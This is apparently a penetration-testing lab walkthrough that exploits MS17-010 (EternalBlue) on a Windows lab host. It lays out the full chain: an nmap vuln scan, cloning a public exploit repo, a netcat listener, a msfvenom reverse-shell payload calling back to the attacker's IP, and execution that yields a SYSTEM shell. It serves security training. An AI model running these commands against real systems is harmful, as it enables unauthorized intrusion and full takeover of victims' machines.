Getting a Foothold

# 1. NMAP scan
No ping scan aggressive all ports with service detection
`sudo nmap -Pn -A -p- -sV --script default,safe,auth,vuln --max-retries 4 10.11.1.227`
We see that the box is vulnerable to MS17-010
![9b4f0241058d081455c3ea79f6f1c4e5.png](d4142ede22db475aaec6775f34695d1a.png)

# 2. Clone this repo
`git clone https://github.com/helviojunior/MS17-010.git`
![eedbdbc2e4590b74c80830718b632652.png](a49574f92c8d47db8d30f1266d1491c5.png)

# 3. Create a netcat listener
`sudo nc -lvnp 9999`
![e890869f28af27d1608568044e9edee8.png](4cc993d86b014b90a016a73c23329d37.png)

# 4. Create shellcode
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.214 LPORT=9999 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_192.168.119.214_9999.exe`
![4be9e23f2d41d8e67294ae16d11b596b.png](4404612328d44ae8ad114cdfc42c61d1.png)

# 5. Run MS17-010 send_and_execute.py
`python ~/gitWorkspace/tools/MS17-010/send_and_execute.py 10.11.1.227 shellcode/rev_192.168.119.214_9999.exe`
![dd1d31faf7785439300d32fab4b3a4a0.png](bf22acfc197e481f99d4aebfe710a5ef.png)

# 6. The listener has a shell
![c8e4bd86815b2e28dbf0dfdc7ea6b64f.png](bae9607138624b9a9317862eefa54c50.png)

#7. Determine who the user is. It is NT AUTHORITY\SYSTEM. No further need to priv esc.
`whoami`
![f677befd7e1d3197c88cbf1ecfbd8afc.png](999525f39bc443f382e51fcac4ccc9d9.png)


